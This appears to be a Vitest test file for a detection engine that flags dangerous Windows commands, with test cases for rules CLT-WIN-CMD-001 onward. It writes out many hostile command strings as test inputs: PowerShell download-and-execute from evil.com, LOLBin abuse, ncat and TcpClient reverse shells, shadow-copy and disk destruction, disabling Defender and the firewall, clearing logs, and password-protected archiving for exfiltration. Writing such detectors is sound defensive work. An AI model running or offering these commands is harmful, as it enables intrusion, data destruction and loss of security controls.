import { beforeAll, describe, expect, it } from "vitest";
import type { HeuristicsEngine } from "../heuristics.js";
import { createMatcher, loadEngine } from "./test-helper.js";

const matchCommand = createMatcher("command");

describe("Windows command threats", () => {
	let engine: HeuristicsEngine;

	beforeAll(async () => {
		engine = await loadEngine();
	});

	// --- PowerShell Download-Execute (WIN-CMD-001) ---

	it("detects irm | iex", () => {
		expect(matchCommand(engine, "irm https://evil.com/install.ps1 | iex")).toContain(
			"CLT-WIN-CMD-001",
		);
	});

	it("detects iwr | iex", () => {
		expect(matchCommand(engine, "iwr https://evil.com/payload.ps1 | iex")).toContain(
			"CLT-WIN-CMD-001",
		);
	});

	it("detects Invoke-WebRequest | Invoke-Expression", () => {
		expect(
			matchCommand(engine, "Invoke-WebRequest https://evil.com/s.ps1 | Invoke-Expression"),
		).toContain("CLT-WIN-CMD-001");
	});

	it("detects Invoke-RestMethod | Invoke-Expression", () => {
		expect(
			matchCommand(engine, "Invoke-RestMethod https://evil.com/s.ps1 | Invoke-Expression"),
		).toContain("CLT-WIN-CMD-001");
	});

	it("detects curl | iex (PS alias)", () => {
		expect(matchCommand(engine, "curl https://evil.com/install.ps1 | iex")).toContain(
			"CLT-WIN-CMD-001",
		);
	});

	it("detects wget | iex (PS alias)", () => {
		expect(matchCommand(engine, "wget https://evil.com/install.ps1 | iex")).toContain(
			"CLT-WIN-CMD-001",
		);
	});

	// --- IEX wrapping download (WIN-CMD-002) ---

	it("detects iex(irm url)", () => {
		expect(matchCommand(engine, "iex(irm https://evil.com/s.ps1)")).toContain("CLT-WIN-CMD-002");
	});

	it("detects IEX((New-Object Net.WebClient).DownloadString(url))", () => {
		expect(
			matchCommand(
				engine,
				"IEX((New-Object Net.WebClient).DownloadString('https://evil.com/s.ps1'))",
			),
		).toContain("CLT-WIN-CMD-002");
	});

	it("detects iex(iwr url)", () => {
		expect(matchCommand(engine, "iex(iwr https://evil.com/s.ps1)")).toContain("CLT-WIN-CMD-002");
	});

	// --- Start-Process (WIN-CMD-003) ---

	it("detects Start-Process with exe", () => {
		expect(matchCommand(engine, "Start-Process -FilePath malware.exe")).toContain(
			"CLT-WIN-CMD-003",
		);
	});

	it("detects Start-Process with ps1", () => {
		expect(matchCommand(engine, "Start-Process -FilePath payload.ps1")).toContain(
			"CLT-WIN-CMD-003",
		);
	});

	// --- Download then execute chain (WIN-CMD-004) ---

	it("detects curl -o file.cmd && execute", () => {
		expect(
			matchCommand(
				engine,
				"curl -fsSL https://evil.com/install.cmd -o install.cmd && install.cmd && del install.cmd",
			),
		).toContain("CLT-WIN-CMD-004");
	});

	it("detects iwr -OutFile then semicolon execute", () => {
		expect(matchCommand(engine, "iwr https://evil.com/s.ps1 -OutFile s.ps1; .\\s.ps1")).toContain(
			"CLT-WIN-CMD-004",
		);
	});

	// --- .NET WebClient (WIN-CMD-005) ---

	it("detects New-Object Net.WebClient DownloadString", () => {
		expect(
			matchCommand(engine, "(New-Object Net.WebClient).DownloadString('https://evil.com/s.ps1')"),
		).toContain("CLT-WIN-CMD-005");
	});

	it("detects New-Object Net.WebClient DownloadFile", () => {
		expect(
			matchCommand(
				engine,
				"(New-Object Net.WebClient).DownloadFile('https://evil.com/m.exe','m.exe')",
			),
		).toContain("CLT-WIN-CMD-005");
	});

	// --- Start-BitsTransfer (WIN-CMD-006) ---

	it("detects Start-BitsTransfer", () => {
		expect(
			matchCommand(
				engine,
				"Start-BitsTransfer -Source https://evil.com/payload.exe -Destination C:\\temp\\payload.exe",
			),
		).toContain("CLT-WIN-CMD-006");
	});

	// --- LOLBins ---

	it("detects certutil -urlcache (WIN-CMD-007)", () => {
		expect(
			matchCommand(engine, "certutil -urlcache -f https://evil.com/payload.exe payload.exe"),
		).toContain("CLT-WIN-CMD-007");
	});

	it("detects certutil -decode (WIN-CMD-007)", () => {
		expect(matchCommand(engine, "certutil -decode encoded.b64 payload.exe")).toContain(
			"CLT-WIN-CMD-007",
		);
	});

	it("detects bitsadmin /transfer (WIN-CMD-008)", () => {
		expect(
			matchCommand(
				engine,
				"bitsadmin /transfer myJob https://evil.com/payload.exe C:\\temp\\payload.exe",
			),
		).toContain("CLT-WIN-CMD-008");
	});

	it("detects mshta remote HTA (WIN-CMD-009)", () => {
		expect(matchCommand(engine, "mshta https://evil.com/payload.hta")).toContain("CLT-WIN-CMD-009");
	});

	it("detects regsvr32 scriptlet (WIN-CMD-010)", () => {
		expect(
			matchCommand(engine, "regsvr32 /s /i:https://evil.com/payload.sct scrobj.dll"),
		).toContain("CLT-WIN-CMD-010");
	});

	it("detects rundll32 javascript (WIN-CMD-011)", () => {
		expect(
			matchCommand(engine, 'rundll32 javascript:"\\..\\mshtml,RunHTMLApplication";alert(1)'),
		).toContain("CLT-WIN-CMD-011");
	});

	it("detects cmstp INF (WIN-CMD-012)", () => {
		expect(matchCommand(engine, "cmstp /au /s evil.inf")).toContain("CLT-WIN-CMD-012");
	});

	it("detects wmic process call create (WIN-CMD-013)", () => {
		expect(matchCommand(engine, 'wmic process call create "cmd /c malware.exe"')).toContain(
			"CLT-WIN-CMD-013",
		);
	});

	it("detects msiexec remote (WIN-CMD-014)", () => {
		expect(matchCommand(engine, "msiexec /q /i https://evil.com/pkg.msi")).toContain(
			"CLT-WIN-CMD-014",
		);
	});

	it("detects forfiles /c cmd (WIN-CMD-015)", () => {
		expect(matchCommand(engine, 'forfiles /c "cmd /c payload.exe"')).toContain("CLT-WIN-CMD-015");
	});

	it("detects pcalua -a (WIN-CMD-016)", () => {
		expect(matchCommand(engine, "pcalua -a malware.exe")).toContain("CLT-WIN-CMD-016");
	});

	it("detects installutil (WIN-CMD-017)", () => {
		expect(matchCommand(engine, "installutil /logfile= /logtoconsole=false payload.dll")).toContain(
			"CLT-WIN-CMD-017",
		);
	});

	it("detects regasm /u (WIN-CMD-018)", () => {
		expect(matchCommand(engine, "regasm /u payload.dll")).toContain("CLT-WIN-CMD-018");
	});

	it("detects regsvcs (WIN-CMD-018)", () => {
		expect(matchCommand(engine, "regsvcs payload.dll")).toContain("CLT-WIN-CMD-018");
	});

	// --- Destructive operations ---

	it("detects format C: (WIN-CMD-019)", () => {
		expect(matchCommand(engine, "format C:")).toContain("CLT-WIN-CMD-019");
	});

	it("detects rd /s /q C:\\ (WIN-CMD-020)", () => {
		expect(matchCommand(engine, "rd /s /q C:\\")).toContain("CLT-WIN-CMD-020");
	});

	it("detects del /f /s /q C:\\ (WIN-CMD-021)", () => {
		expect(matchCommand(engine, "del /f /s /q C:\\")).toContain("CLT-WIN-CMD-021");
	});

	it("detects diskpart (WIN-CMD-022)", () => {
		expect(matchCommand(engine, "diskpart")).toContain("CLT-WIN-CMD-022");
	});

	it("detects diskpart with a script argument (WIN-CMD-022)", () => {
		expect(matchCommand(engine, "diskpart /s wipe.txt")).toContain("CLT-WIN-CMD-022");
	});

	it("detects diskpart dispatched via cmd /c (WIN-CMD-022)", () => {
		expect(matchCommand(engine, "cmd /c diskpart /s wipe.txt")).toContain("CLT-WIN-CMD-022");
	});

	it("detects diskpart dispatched via cmd.exe /c (WIN-CMD-022)", () => {
		expect(matchCommand(engine, "cmd.exe /c diskpart /s wipe.txt")).toContain("CLT-WIN-CMD-022");
	});

	it("detects diskpart dispatched via uppercase CMD /C (WIN-CMD-022)", () => {
		expect(matchCommand(engine, "CMD /C diskpart /s wipe.txt")).toContain("CLT-WIN-CMD-022");
	});

	it("detects explicit diskpart.exe invocation (WIN-CMD-022)", () => {
		expect(matchCommand(engine, "diskpart.exe /s wipe.txt")).toContain("CLT-WIN-CMD-022");
	});

	it("detects diskpart.exe dispatched via cmd /c (WIN-CMD-022)", () => {
		expect(matchCommand(engine, "cmd /c diskpart.exe /s wipe.txt")).toContain("CLT-WIN-CMD-022");
	});

	it("detects diskpart via an unquoted single-token POSIX -c payload (WIN-CMD-022)", () => {
		// A lone trailing token has no positional parameters to misattribute --
		// it's the entire command string either way, quoted or not.
		expect(matchCommand(engine, "bash -c diskpart")).toContain("CLT-WIN-CMD-022");
		expect(matchCommand(engine, "sh -c diskpart")).toContain("CLT-WIN-CMD-022");
	});

	it("does not match diskpart after an unquoted multi-token POSIX -c (WIN-CMD-022 FP)", () => {
		// Only "sudo" is actually executed here; "diskpart" is an inert
		// positional parameter, same trap as the CLT-CMD-007/009 FP guards.
		const ids = matchCommand(engine, "bash -c sudo diskpart");
		expect(ids).not.toContain("CLT-WIN-CMD-022");
	});

	it("does not match a filename mentioning diskpart (WIN-CMD-022 FP)", () => {
		const ids = matchCommand(engine, "notepad diskpart-notes.txt");
		expect(ids).not.toContain("CLT-WIN-CMD-022");
	});

	it("does not match a filename that merely starts with diskpart.exe (WIN-CMD-022 FP)", () => {
		const ids = matchCommand(engine, "notepad diskpart.exe.txt");
		expect(ids).not.toContain("CLT-WIN-CMD-022");
	});

	it("does not match a compound identifier containing diskpart (WIN-CMD-022 FP)", () => {
		const ids = matchCommand(engine, "build tools/diskpart-wrapper/main.go");
		expect(ids).not.toContain("CLT-WIN-CMD-022");
	});

	it("does not match a quoted mention of diskpart (WIN-CMD-022 FP)", () => {
		const ids = matchCommand(engine, 'echo "run diskpart to inspect volumes"');
		expect(ids).not.toContain("CLT-WIN-CMD-022");
	});

	it("does not match prose naming cmd /c without a dangerous payload (WIN-CMD-022 FP)", () => {
		const ids = matchCommand(engine, 'echo "use cmd /c diskpart to fix disks"');
		expect(ids).not.toContain("CLT-WIN-CMD-022");
	});

	// --- Reverse shells ---

	it("detects PS TCP reverse shell (WIN-CMD-023)", () => {
		expect(
			matchCommand(engine, "New-Object System.Net.Sockets.TcpClient('10.0.0.1',4444)"),
		).toContain("CLT-WIN-CMD-023");
	});

	it("detects PS UDP reverse shell (WIN-CMD-024)", () => {
		expect(
			matchCommand(engine, "New-Object System.Net.Sockets.UdpClient('10.0.0.1',4444)"),
		).toContain("CLT-WIN-CMD-024");
	});

	// --- Privilege escalation ---

	it("detects runas /user: (WIN-CMD-025)", () => {
		expect(matchCommand(engine, "runas /user:Administrator cmd.exe")).toContain("CLT-WIN-CMD-025");
	});

	it("detects Set-ExecutionPolicy Bypass (WIN-CMD-026)", () => {
		expect(matchCommand(engine, "Set-ExecutionPolicy Bypass")).toContain("CLT-WIN-CMD-026");
	});

	it("detects Set-ExecutionPolicy Unrestricted (WIN-CMD-026)", () => {
		expect(matchCommand(engine, "Set-ExecutionPolicy Unrestricted")).toContain("CLT-WIN-CMD-026");
	});

	it("detects fodhelper (WIN-CMD-027)", () => {
		expect(matchCommand(engine, "fodhelper")).toContain("CLT-WIN-CMD-027");
	});

	// --- PowerShell Destructive Operations (028-029) ---

	it("detects Remove-Item -Recurse -Force (WIN-CMD-028)", () => {
		expect(matchCommand(engine, "Remove-Item C:\\Users\\Public -Recurse -Force")).toContain(
			"CLT-WIN-CMD-028",
		);
	});

	it("detects Remove-Item -Force -Recurse (reversed flags) (WIN-CMD-028)", () => {
		expect(
			matchCommand(engine, "Remove-Item C:\\ProgramData\\VendorCache -Force -Recurse"),
		).toContain("CLT-WIN-CMD-028");
	});

	it("detects Remove-Item -Recurse -Force targeting windir (WIN-CMD-028)", () => {
		const command = "Remove-Item " + "-Recurse -Force -Path " + "$env:windir\\Temp";
		expect(matchCommand(engine, command)).toContain("CLT-WIN-CMD-028");
	});

	it("detects Remove-Item -Recurse -Force targeting braced windir (WIN-CMD-028)", () => {
		const command = "Remove-Item " + "-Recurse -Force -Path " + "${" + "env:windir}\\Temp";
		expect(matchCommand(engine, command)).toContain("CLT-WIN-CMD-028");
	});

	it("detects Clear-RecycleBin -Force (WIN-CMD-029)", () => {
		expect(matchCommand(engine, "Clear-RecycleBin -Force")).toContain("CLT-WIN-CMD-029");
	});

	// --- Additional Reverse Shells (030) ---

	it("detects ncat -e cmd (WIN-CMD-030)", () => {
		expect(matchCommand(engine, "ncat 10.0.0.1 4444 -e cmd")).toContain("CLT-WIN-CMD-030");
	});

	it("detects ncat -e powershell.exe (WIN-CMD-030)", () => {
		expect(matchCommand(engine, "ncat 10.0.0.1 4444 -e powershell.exe")).toContain(
			"CLT-WIN-CMD-030",
		);
	});

	// --- Shadow Copy / Recovery Destruction (031-034) ---

	it("detects vssadmin delete shadows (WIN-CMD-031)", () => {
		expect(matchCommand(engine, "vssadmin delete shadows /all /quiet")).toContain(
			"CLT-WIN-CMD-031",
		);
	});

	it("detects vssadmin Delete Shadows mixed case (WIN-CMD-031)", () => {
		expect(matchCommand(engine, "vssadmin Delete Shadows /All")).toContain("CLT-WIN-CMD-031");
	});

	it("detects wmic shadowcopy delete (WIN-CMD-032)", () => {
		expect(matchCommand(engine, "wmic shadowcopy delete")).toContain("CLT-WIN-CMD-032");
	});

	it("detects bcdedit recovery disable (WIN-CMD-033)", () => {
		expect(matchCommand(engine, "bcdedit /set {default} recoveryenabled No")).toContain(
			"CLT-WIN-CMD-033",
		);
	});

	it("detects PowerShell WMI shadow copy deletion (WIN-CMD-034)", () => {
		expect(
			matchCommand(engine, "Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }"),
		).toContain("CLT-WIN-CMD-034");
	});

	it("detects PowerShell CIM shadow copy deletion (WIN-CMD-034)", () => {
		expect(matchCommand(engine, "Get-CimInstance Win32_ShadowCopy | Remove-CimInstance")).toContain(
			"CLT-WIN-CMD-034",
		);
	});

	// --- Defense Evasion / Anti-Forensics (035-039) ---

	it("detects wevtutil cl Security (WIN-CMD-035)", () => {
		expect(matchCommand(engine, "wevtutil cl Security")).toContain("CLT-WIN-CMD-035");
	});

	it("detects wevtutil clear-log (WIN-CMD-035)", () => {
		expect(matchCommand(engine, "wevtutil clear-log Application")).toContain("CLT-WIN-CMD-035");
	});

	it("detects Clear-EventLog (WIN-CMD-036)", () => {
		expect(matchCommand(engine, "Clear-EventLog -LogName Security")).toContain("CLT-WIN-CMD-036");
	});

	it("detects Remove-EventLog (WIN-CMD-036)", () => {
		expect(matchCommand(engine, "Remove-EventLog -LogName MyLog")).toContain("CLT-WIN-CMD-036");
	});

	it("detects Clear-EventLog dispatched via cmd /c (WIN-CMD-036)", () => {
		expect(matchCommand(engine, "cmd /c Clear-EventLog -LogName Security")).toContain(
			"CLT-WIN-CMD-036",
		);
	});

	it("detects Clear-EventLog via unquoted powershell -Command (WIN-CMD-036)", () => {
		expect(matchCommand(engine, "powershell -Command Clear-EventLog -LogName Security")).toContain(
			"CLT-WIN-CMD-036",
		);
	});

	it("detects Clear-EventLog via uppercase PowerShell -Command (WIN-CMD-036)", () => {
		expect(matchCommand(engine, "PowerShell -Command Clear-EventLog -LogName Security")).toContain(
			"CLT-WIN-CMD-036",
		);
	});

	it("detects Set-MpPreference -DisableRealtimeMonitoring (WIN-CMD-037)", () => {
		expect(matchCommand(engine, "Set-MpPreference -DisableRealtimeMonitoring $true")).toContain(
			"CLT-WIN-CMD-037",
		);
	});

	it("detects sc stop WinDefend (WIN-CMD-038)", () => {
		expect(matchCommand(engine, "sc stop WinDefend")).toContain("CLT-WIN-CMD-038");
	});

	it("detects net stop MpsSvc (WIN-CMD-038)", () => {
		expect(matchCommand(engine, "net stop MpsSvc")).toContain("CLT-WIN-CMD-038");
	});

	it("detects Stop-Service SecurityHealthService (WIN-CMD-038)", () => {
		expect(matchCommand(engine, "Stop-Service SecurityHealthService")).toContain("CLT-WIN-CMD-038");
	});

	it("detects netsh advfirewall state off (WIN-CMD-039)", () => {
		expect(matchCommand(engine, "netsh advfirewall set allprofiles state off")).toContain(
			"CLT-WIN-CMD-039",
		);
	});

	// --- Data Exfiltration Indicators (040-041) ---

	it("detects rar -p (password archive) (WIN-CMD-040)", () => {
		expect(matchCommand(engine, "rar a -pSECRET archive.rar C:\\Users\\docs\\*")).toContain(
			"CLT-WIN-CMD-040",
		);
	});

	it("detects 7z -p (password archive) (WIN-CMD-040)", () => {
		expect(matchCommand(engine, "7z a -pMyPassword exfil.7z C:\\secrets")).toContain(
			"CLT-WIN-CMD-040",
		);
	});

	it("detects zip --password (WIN-CMD-040)", () => {
		expect(matchCommand(engine, "zip --password SECRET archive.zip file.txt")).toContain(
			"CLT-WIN-CMD-040",
		);
	});

	it("detects bulk *.docx archiving (WIN-CMD-041)", () => {
		expect(matchCommand(engine, "7z a docs.7z C:\\Users\\*.docx")).toContain("CLT-WIN-CMD-041");
	});

	it("detects bulk *.xlsx archiving (WIN-CMD-041)", () => {
		expect(matchCommand(engine, "rar a spreadsheets.rar D:\\Share\\*.xlsx")).toContain(
			"CLT-WIN-CMD-041",
		);
	});

	it("detects bulk *.pdf archiving (WIN-CMD-041)", () => {
		expect(matchCommand(engine, "zip reports.zip C:\\Reports\\*.pdf")).toContain("CLT-WIN-CMD-041");
	});

	it("detects password + document wildcard combo (WIN-CMD-040+041)", () => {
		const ids = matchCommand(engine, "7z a -pSECRET exfil.7z C:\\Users\\*.docx");
		expect(ids).toContain("CLT-WIN-CMD-040");
		expect(ids).toContain("CLT-WIN-CMD-041");
	});

	// --- AutoIt3 Script Execution (042) ---

	it("detects AutoIt3ExecuteScript (WIN-CMD-042)", () => {
		expect(
			matchCommand(
				engine,
				'"C:\\Google\\AutoIt3.exe" /AutoIt3ExecuteScript C:\\Google\\googleupdate.a3x',
			),
		).toContain("CLT-WIN-CMD-042");
	});

	it("detects renamed AutoIt3 binary (WIN-CMD-042)", () => {
		expect(
			matchCommand(
				engine,
				'"C:\\GoogleChrome\\GoogleChrome.exe" /AutoIt3ExecuteScript C:\\GoogleChrome\\GoogleChrome.a3x',
			),
		).toContain("CLT-WIN-CMD-042");
	});

	it("detects cmd start + AutoIt3 (WIN-CMD-042)", () => {
		expect(
			matchCommand(
				engine,
				'"C:\\Windows\\System32\\cmd.exe" /c start C:\\streamer\\streamer.exe /AutoIt3ExecuteScript "C:\\streamer\\stream.txt" & exit',
			),
		).toContain("CLT-WIN-CMD-042");
	});

	it("detects case-insensitive AutoIt3 flag (WIN-CMD-042)", () => {
		expect(matchCommand(engine, "Setup.exe /autoit3executescript c.a3x")).toContain(
			"CLT-WIN-CMD-042",
		);
	});

	// --- Script execution from C:\Users\Public (043) ---

	it("detects wscript from Users\\Public (WIN-CMD-043)", () => {
		expect(matchCommand(engine, 'wscript.exe "C:\\Users\\Public\\Controller\\zakec.js"')).toContain(
			"CLT-WIN-CMD-043",
		);
	});

	it("detects cscript from Users\\Public (WIN-CMD-043)", () => {
		expect(matchCommand(engine, 'cscript.exe "C:\\Users\\Public\\Music\\TvMusic.vbs"')).toContain(
			"CLT-WIN-CMD-043",
		);
	});

	it("detects WScript.exe from Users\\Public\\Documents (WIN-CMD-043)", () => {
		expect(
			matchCommand(
				engine,
				"C:\\Windows\\System32\\wscript.exe C:\\Users\\Public\\Documents\\uqeyi\\osuvi.js",
			),
		).toContain("CLT-WIN-CMD-043");
	});

	it("does not match wscript from normal path (WIN-CMD-043 neg)", () => {
		const ids = matchCommand(engine, 'wscript.exe "C:\\Program Files\\App\\script.vbs"');
		expect(ids.filter((id) => id === "CLT-WIN-CMD-043")).toEqual([]);
	});

	// --- regsvr32 Squiblydoo with remote URL (044) ---

	it("detects regsvr32 /i:shellcode,https:// (WIN-CMD-044)", () => {
		expect(
			matchCommand(
				engine,
				"regsvr32.exe /s /i:shellcode,https://gist.githubusercontent.com/evil/raw/ssl C:\\Users\\Public\\Music\\bin\\64.dll",
			),
		).toContain("CLT-WIN-CMD-044");
	});

	it("detects regsvr32 /i:http:// (WIN-CMD-044)", () => {
		expect(
			matchCommand(engine, "regsvr32 /s /i:http://evil.test/payload.sct scrobj.dll"),
		).toContain("CLT-WIN-CMD-044");
	});

	it("does not match regsvr32 /s normal DLL (WIN-CMD-044 neg)", () => {
		const ids = matchCommand(engine, 'regsvr32.exe /s "C:\\Program Files\\App\\control.dll"');
		expect(ids.filter((id) => id === "CLT-WIN-CMD-044")).toEqual([]);
	});

	// --- cmdl32.exe LOLBin (045) ---

	it("detects cmdl32.exe with an unquoted path prefix (WIN-CMD-045)", () => {
		expect(
			matchCommand(
				engine,
				"C:\\Windows\\System32\\cmdl32.exe /VPN C:\\ProgramData\\Microsoft\\Network\\Connections\\Cm\\vpn1.cmp",
			),
		).toContain("CLT-WIN-CMD-045");
	});

	it("does not match a bare fully-quoted cmdl32.exe invocation with no wrapper (WIN-CMD-045)", () => {
		// {{CMD_POS}} doesn't admit a leading quote outside a dispatch context --
		// same accepted gap as CLT-MITRE-096 (tscon).
		const ids = matchCommand(
			engine,
			'"C:\\Windows\\System32\\cmdl32.exe" /VPN "C:\\ProgramData\\Microsoft\\Network\\Connections\\Cm\\vpn1.cmp"',
		);
		expect(ids.filter((id) => id === "CLT-WIN-CMD-045")).toEqual([]);
	});

	// --- Download then start via single & (046) ---

	it("detects curl --output + start chain (WIN-CMD-046)", () => {
		expect(
			matchCommand(
				engine,
				"cmd /c curl http://evil.test/a.exe --output C:\\Users\\Public\\a.exe & start C:\\Users\\Public\\a.exe",
			),
		).toContain("CLT-WIN-CMD-046");
	});

	it("detects curl -o + start chain (WIN-CMD-046)", () => {
		expect(
			matchCommand(
				engine,
				"curl http://evil.test/payload.exe -o C:\\temp\\p.exe & start C:\\temp\\p.exe",
			),
		).toContain("CLT-WIN-CMD-046");
	});

	it("detects wget --output + start chain (WIN-CMD-046)", () => {
		expect(
			matchCommand(
				engine,
				"wget http://evil.test/m.exe --output C:\\Users\\Public\\m.exe & start C:\\Users\\Public\\m.exe",
			),
		).toContain("CLT-WIN-CMD-046");
	});

	it("does not match curl without start (WIN-CMD-046 neg)", () => {
		const ids = matchCommand(engine, "curl http://example.com/data.json --output data.json");
		expect(ids.filter((id) => id === "CLT-WIN-CMD-046")).toEqual([]);
	});

	// --- Negative cases ---

	it("does not match Get-Help", () => {
		const ids = matchCommand(engine, "Get-Help Invoke-WebRequest");
		expect(ids.filter((id) => id.startsWith("CLT-WIN-CMD"))).toEqual([]);
	});

	it("does not match simple dir command", () => {
		const ids = matchCommand(engine, "dir C:\\Users");
		expect(ids.filter((id) => id.startsWith("CLT-WIN-CMD"))).toEqual([]);
	});

	it("does not match normal curl to file without execute", () => {
		const ids = matchCommand(engine, "curl -o output.txt https://example.com/data.json");
		expect(ids.filter((id) => id === "CLT-WIN-CMD-004")).toEqual([]);
	});

	it("does not match Get-Process", () => {
		const ids = matchCommand(engine, "Get-Process | Where-Object { $_.CPU -gt 100 }");
		expect(ids.filter((id) => id.startsWith("CLT-WIN-CMD"))).toEqual([]);
	});

	it("does not match vssadmin list shadows", () => {
		const ids = matchCommand(engine, "vssadmin list shadows");
		expect(ids.filter((id) => id === "CLT-WIN-CMD-031")).toEqual([]);
	});

	it("does not match wevtutil qe (query)", () => {
		const ids = matchCommand(engine, "wevtutil qe Security /c:10");
		expect(ids.filter((id) => id === "CLT-WIN-CMD-035")).toEqual([]);
	});

	it("does not match 7z without password (normal archive)", () => {
		const ids = matchCommand(engine, "7z a archive.7z src/");
		expect(ids.filter((id) => id === "CLT-WIN-CMD-040")).toEqual([]);
	});

	it("does not match sc query WinDefend (status check)", () => {
		const ids = matchCommand(engine, "sc query WinDefend");
		expect(ids.filter((id) => id === "CLT-WIN-CMD-038")).toEqual([]);
	});

	// --- Additional FP coverage ---

	it("does not match Start-Process without executable extension (003 FP)", () => {
		const ids = matchCommand(engine, 'Start-Process -FilePath "notepad"');
		expect(ids).not.toContain("CLT-WIN-CMD-003");
	});

	it("does not match Get-BitsTransfer (006 FP)", () => {
		const ids = matchCommand(engine, "Get-BitsTransfer");
		expect(ids).not.toContain("CLT-WIN-CMD-006");
	});

	it("does not match Format-Table (019 FP)", () => {
		const ids = matchCommand(engine, "Format-Table -Property Name,Value");
		expect(ids).not.toContain("CLT-WIN-CMD-019");
	});

	it("does not match Set-ExecutionPolicy RemoteSigned (026 FP)", () => {
		const ids = matchCommand(engine, "Set-ExecutionPolicy RemoteSigned");
		expect(ids).not.toContain("CLT-WIN-CMD-026");
	});

	it("does not match Get-ExecutionPolicy (026 FP)", () => {
		const ids = matchCommand(engine, "Get-ExecutionPolicy");
		expect(ids).not.toContain("CLT-WIN-CMD-026");
	});

	it("does not match Remove-Item without -Recurse -Force (028 FP)", () => {
		const ids = matchCommand(engine, "Remove-Item -Path .\\temp.txt");
		expect(ids).not.toContain("CLT-WIN-CMD-028");
	});

	it("does not match Remove-Item project cleanup (028)", () => {
		const command = "Remove-Item .next " + "-Recurse -Force";
		const ids = matchCommand(engine, command);
		expect(ids).not.toContain("CLT-WIN-CMD-028");
	});

	it("does not match Remove-Item temp directory cleanup (028)", () => {
		const command = "Remove-Item $env:TEMP\\build-cache " + "-Recurse -Force";
		const ids = matchCommand(engine, command);
		expect(ids).not.toContain("CLT-WIN-CMD-028");
	});

	it("does not match Remove-Item cleanup with later high-risk path (028)", () => {
		const command = "Remove-Item .next -Recurse -Force; Write-Host C:\\Windows";
		const ids = matchCommand(engine, command);
		expect(ids).not.toContain("CLT-WIN-CMD-028");
	});

	it("does not match Remove-Item cleanup with high-risk path in comment (028)", () => {
		const command = "Remove-Item .next -Recurse -Force # C:\\Windows";
		const ids = matchCommand(engine, command);
		expect(ids).not.toContain("CLT-WIN-CMD-028");
	});

	it("does not match Remove-Item Windows.old cleanup (028)", () => {
		const command = "Remove-Item " + "-Recurse -Force -Path " + "C:\\Windows.old";
		const ids = matchCommand(engine, command);
		expect(ids).not.toContain("CLT-WIN-CMD-028");
	});

	it("does not match Clear-RecycleBin without -Force (029 FP)", () => {
		const ids = matchCommand(engine, "Clear-RecycleBin");
		expect(ids).not.toContain("CLT-WIN-CMD-029");
	});

	it("does not match bcdedit /enum (033 FP)", () => {
		const ids = matchCommand(engine, "bcdedit /enum");
		expect(ids).not.toContain("CLT-WIN-CMD-033");
	});

	it("does not match Get-MpPreference (037 FP)", () => {
		const ids = matchCommand(engine, "Get-MpPreference");
		expect(ids).not.toContain("CLT-WIN-CMD-037");
	});

	it("does not match 7z archiving non-document wildcards (041 FP)", () => {
		const ids = matchCommand(engine, "7z a backup.7z src/*.json");
		expect(ids).not.toContain("CLT-WIN-CMD-041");
	});

	it("does not match zip without password for normal files (040 FP)", () => {
		const ids = matchCommand(engine, "zip archive.zip src/*.ts");
		expect(ids).not.toContain("CLT-WIN-CMD-040");
	});

	it("does not match netsh advfirewall show (039 FP)", () => {
		const ids = matchCommand(engine, "netsh advfirewall show allprofiles state");
		expect(ids).not.toContain("CLT-WIN-CMD-039");
	});

	it("does not match Get-EventLog (036 FP)", () => {
		const ids = matchCommand(engine, "Get-EventLog -LogName Application -Newest 10");
		expect(ids).not.toContain("CLT-WIN-CMD-036");
	});

	it("does not match a compound cmdlet name (036 FP)", () => {
		const ids = matchCommand(engine, "Old-Clear-EventLog -LogName Security");
		expect(ids).not.toContain("CLT-WIN-CMD-036");
	});

	it("does not match a longer identifier containing the cmdlet name (036 FP)", () => {
		const ids = matchCommand(engine, "Get-Command Clear-EventLogViewer");
		expect(ids).not.toContain("CLT-WIN-CMD-036");
	});

	it("does not match a quoted mention of the cmdlet (036 FP)", () => {
		const ids = matchCommand(engine, 'echo "Clear-EventLog is used to purge logs"');
		expect(ids).not.toContain("CLT-WIN-CMD-036");
	});

	it("does not match a filename mentioning the cmdlet (036 FP)", () => {
		const ids = matchCommand(engine, "notepad C:\\tmp\\Clear-EventLog.txt");
		expect(ids).not.toContain("CLT-WIN-CMD-036");
	});

	it("does not match inspecting the cmdlet without invoking it (036 FP)", () => {
		const ids = matchCommand(engine, "Get-Command Clear-EventLog");
		expect(ids).not.toContain("CLT-WIN-CMD-036");
	});

	// --- Shadow copy/VSS/backup destruction (WIN-CMD-047) ---

	it("detects vssadmin resize shadowstorage (WIN-CMD-047)", () => {
		expect(
			matchCommand(engine, "vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB"),
		).toContain("CLT-WIN-CMD-047");
	});

	it("detects wbadmin delete catalog (WIN-CMD-047)", () => {
		expect(matchCommand(engine, "wbadmin delete catalog -quiet")).toContain("CLT-WIN-CMD-047");
	});

	it("detects VSS service disable via reg (WIN-CMD-047)", () => {
		expect(
			matchCommand(
				engine,
				"reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\VSS /v Start /t REG_DWORD /d 4 /f",
			),
		).toContain("CLT-WIN-CMD-047");
	});

	// --- Firewall manipulation (WIN-CMD-048/049) ---

	it("detects legacy netsh firewall opmode DISABLE (WIN-CMD-048)", () => {
		expect(matchCommand(engine, "netsh firewall set opmode mode=DISABLE")).toContain(
			"CLT-WIN-CMD-048",
		);
	});

	it("detects netsh advfirewall add rule (WIN-CMD-049)", () => {
		expect(
			matchCommand(
				engine,
				"netsh advfirewall firewall add rule name=backdoor program=C:\\evil.exe action=allow",
			),
		).toContain("CLT-WIN-CMD-049");
	});

	// --- LOLBins (WIN-CMD-050..055) ---

	it("detects regsvr32 /i:http (WIN-CMD-050)", () => {
		expect(
			matchCommand(engine, "regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll"),
		).toContain("CLT-WIN-CMD-050");
	});

	it("detects Mavinject64.exe (WIN-CMD-051)", () => {
		expect(
			matchCommand(engine, "C:\\Windows\\Mavinject64.exe 1234 /INJECTRUNNING evil.dll"),
		).toContain("CLT-WIN-CMD-051");
	});

	it("detects inject_dll_x86.exe (WIN-CMD-052)", () => {
		expect(matchCommand(engine, "C:\\tools\\inject_dll_x86.exe")).toContain("CLT-WIN-CMD-052");
	});

	it("detects PowerShdll.dll (WIN-CMD-053)", () => {
		expect(matchCommand(engine, "rundll32.exe PowerShdll.dll,main")).toContain("CLT-WIN-CMD-053");
	});

	it("detects SyncAppvPublishingServer iex (WIN-CMD-054)", () => {
		expect(matchCommand(engine, 'SyncAppvPublishingServer.vbs "Break; iex cmd"')).toContain(
			"CLT-WIN-CMD-054",
